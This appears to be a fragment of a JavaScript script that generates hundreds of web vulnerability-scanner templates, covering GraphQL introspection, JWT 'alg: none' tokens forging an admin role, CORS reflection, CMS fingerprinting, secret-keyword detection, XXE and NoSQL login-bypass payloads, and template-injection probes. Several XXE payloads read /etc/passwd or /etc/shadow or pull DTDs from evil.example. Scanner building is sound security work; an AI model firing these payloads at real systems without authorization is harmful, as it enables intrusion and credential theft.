const gql2P = ["{__schema{types{name}}}", "{__typename}", "query{__typename}", "{__schema{queryType{name}}}", "{\"query\":\"{__schema{types{name}}}\"}", "{__schema{mutationType{name}}}", "{__schema{directives{name}}}", "{__schema{types{fields{name}}}}", "fragment F on Query{__typename}", "{_service{sdl}}", "q1:__typename", "{__type(name:\"Query\"){name}}", "{__schema{subscriptionType{name}}}", "{node{id}}", "{viewer{__typename}}"];
let g2 = 0;
for (const param of ["query", "q", "graphql", "operation"]) {
  for (const pay of gql2P) {
    g2++;
    act("exposure", `graphql2-${String(g2).padStart(2, "0")}`, `Introspection probe in ${param}`,
      "medium", ["graphql", "api", "introspection"], `GraphQL schema exposed via ${param}`,
      [R("{{BaseURL}}", { [param]: [pay] }, [W(["__schema", "__typename"])])]);
  }
}
const gql3P = ["mutation{__typename}", "subscription{__typename}", "mutation{createUser{__typename}}", "{__schema @include(if:true){queryType{name}}}", "query Q($x:Int=1){__typename}", "{...F}fragment F on Query{__typename}", "{__typename @skip(if:false)}", "mutation M{__schema{queryType{name}}}", "{search{__typename}}", "{__type(name:\"User\"){fields{name}}}", "{__schema{types{name,fields{name}}}}", "{a:__typename,b:__typename}", "query{node(id:1){__typename}}", "{__schema{description}}", "{__directive(name:\"x\"){name}}"];
for (let i = 0; i < 60; i++) {
  const param = ["query", "q", "graphql", "operation"][i % 4];
  act("exposure", `graphql3-${String(i + 1).padStart(2, "0")}`, `Mutation probe in ${param}`,
    "medium", ["graphql", "api", "mutation"], `GraphQL mutation reachable via ${param}`,
    [R("{{BaseURL}}", { [param]: [gql3P[i % gql3P.length]] }, [W(["__schema", "__typename", "data"])])]);
}


const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
for (let i = 0; i < 80; i++) {
  const alg = ["none", "None", "NONE", "nOnE"][i % 4];
  const tok = `${b64({ alg, typ: "JWT", kid: `key-${100 + i}` })}.${b64({ sub: `u${i}`, role: "admin" })}.`;
  act("exposure", `jwt2-${String(i + 1).padStart(2, "0")}`, `JWT ${alg} kid key-${100 + i}`,
    "critical", ["jwt", "auth", "none"], `Unsigned token accepted on /api/profile`,
    [{ method: "GET", path: "{{BaseURL}}/api/profile", sendHeaders: { Authorization: `Bearer ${tok}` }, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words: ["admin"] }], matchAll: true }]);
}


for (let i = 0; i < 60; i++) {
  const origin = i === 0 ? "null" : i === 1 ? "https://attacker.com" : `https://evil${100 + i}.example`;
  act("exposure", `cors2-${String(i + 1).padStart(2, "0")}`, `CORS origin ${origin}`,
    "medium", ["cors", "headers", "api"], `Origin reflected on /api/data`,
    [{ method: "GET", path: "{{BaseURL}}/api/data", sendHeaders: { Origin: origin }, matchers: [{ type: "word", part: "headers", words: [origin.replace("https://", "")] }] }]);
}


const cve3Groups = [];
const wpPlugins = ["hello", "classic-editor", "gutenberg", "jetpack", "wordfence", "contact-form-7", "yoast", "woocommerce", "elementor", "akismet"];
for (const slug of wpPlugins) {
  for (const f of ["readme.txt", "readme.md", "CHANGELOG.md", "LICENSE", `${slug}.php`, "uninstall.php", "includes/", "assets/", "languages/", "screenshot.png"]) {
    cve3Groups.push([`wp-${slug}`, `/wp-content/plugins/${slug}/${f}`, `WP ${slug}`]);
  }
}
for (const theme of ["twentytwenty", "twentytwentyone", "astra", "oceanwp", "generatepress"]) {
  for (const f of ["style.css", "screenshot.png", "readme.txt", "functions.php", "header.php", "footer.php", "index.php", "single.php", "page.php", "404.php"]) {
    cve3Groups.push([`wpt-${theme}`, `/wp-content/themes/${theme}/${f}`, `Theme ${theme}`]);
  }
}
for (const mod of ["views", "ctools", "token", "pathauto", "webform"]) {
  for (const f of ["CHANGELOG.txt", "README.md", "LICENSE.txt", `${mod}.info.yml`, `${mod}.module`, "src/", "templates/", "css/", "js/", "config/"]) {
    cve3Groups.push([`drupal-${mod}`, `/modules/contrib/${mod}/${f}`, `Drupal ${mod}`]);
  }
}
for (const comp of ["users", "content", "contact", "banners", "newsfeeds"]) {
  for (const f of ["readme.txt", "changelog.xml", "index.html", "tmpl/", "views/", "models/", "controllers/", "helpers/", "language/", "media/"]) {
    cve3Groups.push([`joomla-${comp}`, `/components/com_${comp}/${f}`, `Joomla ${comp}`]);
  }
}
for (const f of ["_ignition/health-check", "_ignition/execute-solution", "telescope", "telescope/requests", "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", ".env.example", "composer.lock", "package-lock.json", "yarn.lock", "artisan"]) {
  cve3Groups.push([`laravel-misc`, `/${f}`, `Laravel ${f}`]);
}
for (const f of ["env.php", "config.php", "di.xml", "errors/local.xml", "setup/index.php", "pub/errors/default/", "var/log/system.log", "generated/code/", "app/bootstrap.php", "bin/magento"]) {
  cve3Groups.push([`magento-app`, `/app/etc/${f}`, `Magento ${f}`]);
}
for (const f of ["parameters.php", "parameters.yml", "install/index.php", "config/defines.inc.php", "classes/", "controllers/", "modules/", "override/", "themes/", "var/"]) {
  cve3Groups.push([`prestashop-app`, `/app/config/${f}`, `PrestaShop ${f}`]);
}
for (const f of ["config.php", "configuration.php-dist", "logs/", "tmp/", "cache/", "administrator/", "cli/", "libraries/", "plugins/", "templates/"] ) {
  cve3Groups.push([`opencart-sys`, `/system/${f}`, `OpenCart ${f}`]);
}
for (const f of ["api/admin/session", "api/admin/users", "api/content", "api/settings", "api/members", "api/posts", "api/pages", "api/tags", "api/roles", "api/invites"]) {
  cve3Groups.push([`ghost-api`, `/ghost/${f}`, `Ghost ${f}`]);
}
cve3Groups.slice(0, 300).forEach(([slug, bp, label], i) => {
  const words = bp.endsWith("readme.txt") ? ["Stable tag"] : null;
  const req = words
    ? { method: "GET", path: `{{BaseURL}}${bp}`, matchAll: true, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words }] }
    : { method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] };
  act("cve", `cve3-${slug}-${String((i % 10) + 1).padStart(2, "0")}`, `${label} ${bp.split("/").pop()}`,
    "info", ["cve", "fingerprint", "version"], `${label} at ${bp} — match version manually`, [req]);
});


const cve4List = [["spring2", "/actuator/sessions", "Spring sessions"], ["spring2", "/actuator/httptrace", "Spring trace"], ["spring2", "/actuator/logfile", "Spring log"], ["spring2", "/actuator/dump", "Spring dump"], ["spring2", "/actuator/flyway", "Spring flyway"], ["spring2", "/actuator/liquibase", "Spring liquibase"], ["spring2", "/actuator/quartz", "Spring quartz"], ["spring2", "/actuator/circuitbreakers", "Spring breakers"], ["spring2", "/actuator/scheduledtasks", "Spring tasks"], ["spring2", "/actuator/info", "Spring info"]];
const cve4Prods = [["solr2", "/solr/admin/zookeeper", "Solr zk"], ["struts2", "/showcase.action", "Struts"], ["exchange2", "/ecp/", "Exchange"], ["sharepoint2", "/_vti_bin/", "SharePoint"], ["citrix2", "/logon/", "Citrix"], ["f52", "/my.policy", "F5"], ["pulse2", "/dana/html/", "Pulse"], ["grafana2", "/api/health", "Grafana"], ["prom2", "/-/healthy", "Prometheus"], ["zabbix2", "/api_jsonrpc.php", "Zabbix"], ["nagios2", "/cgi-bin/", "Nagios"], ["cacti2", "/auth_login.php", "Cacti"], ["kibana3", "/api/status", "Kibana3"], ["elastic3", "/", "Elastic3"], ["jenkins3", "/api/json", "Jenkins3"], ["gitlab3", "/-/health", "GitLab3"], ["nexus3", "/service/extdirect", "Nexus3"], ["tomcat3", "/examples/", "Tomcat3"], ["weblogic3", "/bea_wls_internal/", "WebLogic3"], ["jboss3", "/web-console/", "JBoss3"]];
for (const [base, bp, label] of cve4Prods) {
  for (let v = 2; v <= 13; v++) cve4List.push([base, `${bp}?v=${v}`, `${label}`]);
}
const seen4 = {};
cve4List.slice(0, 300).forEach(([base, bp, label]) => {
  seen4[base] = (seen4[base] || 0) + 1;
  const tag = `${base}-${String(seen4[base]).padStart(2, "0")}`;
  const words = base === "spring2" && bp === "/actuator/sessions" ? ["sessions"] : null;
  const req = words
    ? { method: "GET", path: `{{BaseURL}}${bp}`, matchAll: true, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words }] }
    : { method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] };
  act("cve", tag, `${label} ${bp.split("?")[0].split("/").pop() || "root"}`,
    "info", ["cve", "fingerprint", "version"], `${label} at ${bp.split("?")[0]} — match version manually`, [req]);
});


const sec3List = ["sk-proj-", "sk-ant-", "mfa.", "123456:AA", "supabase", "pscale_", "npi_", "vercel_", "cf_", "dd_", "sntrys_", "phc_", "amp_", "seg_", "alg_", "cloudinary://", "imgix", "fastly_", "akab-", "dop_", "linode", "vultr", "hetzner", "ovh", "scaleway", "ibmcloud", "tencent", "alibaba", "huawei", "snowflake", "databricks", "mongodb+srv", "postgres://", "mysql://", "redis://", "amqp://", "mqtt://", "apikey", "jwt-secret", "session-secret", "cookie-secret", "csrf-secret", "oauth-client-secret", "saml-cert", "ldap-bind", "smtp-pass", "ftp-pass", "ssh-pass", "aes-key", "PRIVATE KEY", "glpat-", "bitbucket", "jira-token", "confluence", "ntn_", "trello", "asana", "monday", "clickup", "lin_api_", "airtable", "hubspot", "salesforce", "pk_live_", "paypal", "square", "braintree", "authorize", "2checkout", "razorpay", "paystack", "flutterwave", "twilio-auth", "vonage", "plivo", "bandwidth", "telnyx", "sinch", "messagebird", "onesignal", "pusher", "ably", "janus", "asterisk", "freeswitch", "npm_", "pypi-", "rubygems", "packagist", "nuget_", "cargo-", "goproxy", "deno_", "bun_", "fly_", "render_", "cyclic_", "replit", "glitch", "codesandbox", "stackblitz", "gitpod", "coder_", "splunk_", "newrelic_", "honeycomb", "lightstep", "appsignal", "skylight", "raygun_", "bugsnag_", "rollbar_", "airbrake", "sentry_key", "uptimerobot", "healthchecks_", "cronitor", "cachet_", "statuspage_", "instatus", "ohdear_", "betterstack_", "logtail_"];
sec3List.forEach((w, i) => {
  write("passive", `sec3-${String(i + 1).padStart(3, "0")}`, { name: `Secret: ${w.slice(0, 24)}`, severity: "high", type: "passive", tags: ["secret", "passive", "exposure"], description: `Possible secret in body — verify manually`, matchers: [{ type: "word", part: "body", words: [w] }] });
});
const hdr3Pos = [["Server version banner", "regex", ["[Aa]pache/[0-9]+\\.[0-9]+", "nginx/[0-9]+\\.[0-9]+", "Microsoft-IIS/[0-9]+"]], ["Powered-by present", "word", ["x-powered-by"]], ["Debug headers", "word", ["x-debug-url", "x-debug-token", "x-profiler", "x-trace-id", "x-request-id-debug", "x-amz-request-id", "x-cloud-trace", "x-server-timing-debug", "x-drupal-cache", "x-generator-debug", "x-wp-debug", "x-laravel-debug", "x-django-debug", "x-rails-debug", "x-spring-debug", "x-express-debug", "x-nextjs-debug", "x-nuxt-debug", "x-aspnet-version", "x-aspnetmvc-version", "x-powered-cms", "x-backend", "x-origin-server", "x-cache-debug", "x-varnish-debug", "x-edge-debug"]]];

write("passive", "hdr3-01", { name: "Server version banner", severity: "info", type: "passive", tags: ["headers", "passive", "fingerprint"], description: "Server banner leaks version", matchers: [{ type: "regex", part: "headers", regex: ["[Aa]pache/[0-9]+\\.[0-9]+", "nginx/[0-9]+\\.[0-9]+"] }] });
write("passive", "hdr3-02", { name: "Powered-by present", severity: "info", type: "passive", tags: ["headers", "passive", "fingerprint"], description: "X-Powered-By header present", matchers: [{ type: "word", part: "headers", words: ["x-powered-by"] }] });
["x-debug-url", "x-debug-token", "x-profiler", "x-trace-id", "x-request-id-debug", "x-amz-request-id", "x-cloud-trace", "x-drupal-cache", "x-generator-debug", "x-wp-debug", "x-laravel-debug", "x-django-debug", "x-rails-debug", "x-spring-debug", "x-express-debug", "x-nextjs-debug", "x-nuxt-debug", "x-aspnet-version", "x-aspnetmvc-version", "x-powered-cms", "x-backend", "x-origin-server", "x-cache-debug", "x-varnish-debug", "x-edge-debug", "x-server-timing-debug", "x-debug-mode", "x-debug"].forEach((h, i) => {
  write("passive", `hdr3-${String(i + 3).padStart(2, "0")}`, { name: `Debug header ${h}`, severity: "low", type: "passive", tags: ["headers", "passive", "debug"], description: `Debug header ${h} present`, matchers: [{ type: "word", part: "headers", words: [h] }] });
});
const fp3List = ["nodejs20", "express4", "next13", "nuxt3", "gatsby5", "sveltekit", "remix2", "astro3", "solidstart", "qwik1", "django42", "flask3", "fastapi09", "laravel10x", "symfony6", "codeigniter4", "cakephp4", "yii2", "springboot3", "micronaut4", "quarkus3", "helidon4", "dotnet8", "blazor8", "rails72", "sinatra3", "hanami2", "phoenix17", "gin17", "echo4", "fiber2", "actix4", "axum07", "hono3", "nestjs10", "adonis6", "strapi4", "ghost5", "wp66", "drupal10", "joomla4", "typo312", "magento2", "prestashop8", "opencart4", "bigcommerce", "shopify2", "medusa2", "saleor3", "wix2", "squarespace7", "webflow2", "framer2", "wordpress61", "ghost55", "strapi45", "payload2", "keystone6", "directus10", "pocketbase02"];
fp3List.slice(0, 60).forEach((t, i) => {
  write("passive", `fp3-${String(i + 1).padStart(2, "0")}`, { name: `Stack ${t}`, severity: "info", type: "passive", tags: ["fingerprint", "passive", "tech"], description: `${t} stack detected`, matchers: [{ type: "word", part: "all", words: [t] }] });
});
const err3List = ["whoops", "ignition", "telescope", "horizon", "nova error", "filament exception", "backpack error", "voyager error", "orchid error", "adminjs", "forestadmin", "refine error", "react-admin", "prisma error", "drizzle error", "typeorm", "sequelize", "knex error", "bookshelf", "waterline", "sails error", "adonis error", "feathers error", "loopback", "strapi error", "keystone error", "payload error", "directus error", "hasura error", "postgraphile", "graphql-yoga", "apollo error", "mercurius", "type-graphql", "nexus error", "pothos", "gridsome", "redwoodjs", "blitzjs", "rakkas", "solidstart error", "analogjs", "nuxt error", "quasar error", "vuetify error", "primevue", "naive-ui", "ant-design", "chakra-ui"];
err3List.slice(0, 50).forEach((w, i) => {
  write("passive", `err3-${String(i + 1).padStart(2, "0")}`, { name: `Framework error: ${w}`, severity: "medium", type: "passive", tags: ["error", "passive", "debug"], description: `Framework error text in body`, matchers: [{ type: "word", part: "body", words: [w] }] });
});


const xxe2P = ["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>", "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><r>&xxe;</r>", "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"http://evil.example/x.dtd\"> %a;]>", "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></r>", "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><r>&xxe;</r>", "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>", "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"expect://id\">]><r>&xxe;</r>", "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index\">]><r>&xxe;</r>", "<?xml version=\"1.0\"?><r>&xxe;&xxe;</r>", "<!DOCTYPE r PUBLIC \"-//X//EN\" \"http://evil.example/dtd\"><r>x</r>", "<?xml-stylesheet type=\"text/xsl\" href=\"file:///etc/passwd\"?>", "<rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><r>&xxe;</r></rdf:RDF>", "<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Envelope>&xxe;</Envelope>", "<?xml version=\"1.0\"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>", "<!DOCTYPE html [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "<svg xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></svg>", "<?xml version=\"1.1\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>", "<!DOCTYPE r [<!ENTITY % p1 SYSTEM \"file:///etc/passwd\"> %p1;]>", "<?xml version=\"1.0\" standalone=\"no\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>", "<X><Y><!ENTITY xxe SYSTEM \"file:///etc/passwd\">&xxe;</Y></X>"];
for (let i = 0; i < 100; i++) {
  const param = ["xml", "data", "body", "payload", "content"][i % 5];
  act("xxe", `xxe2-${String(i + 1).padStart(3, "0")}`, `XXE file read in ${param}`,
    "critical", ["xxe", "injection", "xml"], `XXE entity via ${param}`,
    [R("{{BaseURL}}", { [param]: [xxe2P[i % xxe2P.length]] }, [W(["root:x:0:0", "XXE_OK", "localhost", "uid="])])]);
}
const xxe3P = ["<!DOCTYPE lolz [<!ENTITY lol \"lollollollollollollollol\">]><r>&lol;</r>", "<!DOCTYPE r [<!ENTITY a \"1234567890\"><!ENTITY b \"&a;&a;&a;\">]><r>&b;</r>", "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol1 \"looooooooool\">]><r>&lol1;</r>", "<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///dev/null\">]><x>&xxe;</x>", "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % sp SYSTEM \"http://evil.example/ev.dtd\"> %sp; %param1;]>", "<!DOCTYPE r [<!ENTITY xxe PUBLIC \"x\" \"file:///etc/passwd\">]><r>&xxe;</r>", "<!DOCTYPE r [<!ATTLIST r x CDATA \"file:///etc/passwd\">]>", "<?xml version=\"1.0\"?><r xmlns:xi=\"http://www.w3.org/2003/XInclude\">x</r>"];
for (let i = 0; i < 40; i++) {
  const param = ["xml", "data", "body", "payload", "content"][i % 5];
  act("xxe", `xxe3-${String(i + 1).padStart(2, "0")}`, `XXE DoS/entity in ${param}`,
    "high", ["xxe", "injection", "xml", "dos"], `XXE entity via ${param}`,
    [R("{{BaseURL}}", { [param]: [xxe3P[i % xxe3P.length]] }, [W(["root:x:0:0", "XXE_OK"])])]);
}


const nosqlOps = ["$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin", "$regex", "$where", "$exists", "$type", "$size", "$all", "$elemMatch", "$not"];
for (const op of nosqlOps) {
  for (const field of ["username", "password", "email", "role"]) {
    const k = nosqlOps.indexOf(op) * 4 + ["username", "password", "email", "role"].indexOf(field) + 1;
    act("exposure", `nosql-${String(k).padStart(2, "0")}`, `NoSQL ${op} in ${field}`,
      "high", ["nosql", "injection", "api"], `NoSQL operator ${op} accepted on /api/login`,
      [{ method: "POST", path: "{{BaseURL}}/api/login", body: JSON.stringify({ [field]: { [op]: "" }, extra: "x" }), matchers: [{ type: "status", status: [200] }, { type: "regex", part: "body", regex: ['"token"\\s*:'] }], matchAll: true }]);
  }
}


const spostE = ["jinja2", "twig", "mako", "smarty", "freemarker", "velocity", "erb", "ejs", "handlebars", "django", "flask", "thymeleaf", "pebble", "mustache", "blade", "razor", "jsp", "golang", "perl", "cheetah"];
const spostPay = { mako: "${7*7}", cheetah: "#echo 7*7", smarty: "{7*7}", freemarker: "${7*7}", velocity: "#set($x=7*7)$x", erb: "<%= 7*7 %>", ejs: "<%= 7*7 %>", thymeleaf: "${7*7}", pebble: "{{7*7}}", mustache: "{{7*7}}", blade: "{{7*7}}", razor: "@(7*7)", jsp: "${7*7}", golang: "{{.7}}", perl: "<% 7*7 %>" };
for (const eng of spostE) {
  for (const field of ["template", "view"]) {
    const k = spostE.indexOf(eng) * 2 + (field === "view" ? 2 : 1);
    act("ssti", `ssti-post-${String(k).padStart(3, "0")}`, `POST SSTI ${eng} in ${field}`,
      "critical", ["ssti", "injection", "post", eng], `${eng} evaluates POST body on /render`,
      [{ method: "POST", path: "{{BaseURL}}/render", sendHeaders: { "Content-Type": "application/json" }, body: JSON.stringify({ [field]: spostPay[eng] || "{{7*7}}" }), matchers: [{ type: "word", part: "body", words: [eng === "golang" ? "7" : "49"] }] }]);
  }
}

console.log(`pack3 generated ${n} templates`);
for (const [k, v] of Object.entries(counts).sort()) console.log(`  ${k}: ${v}`);
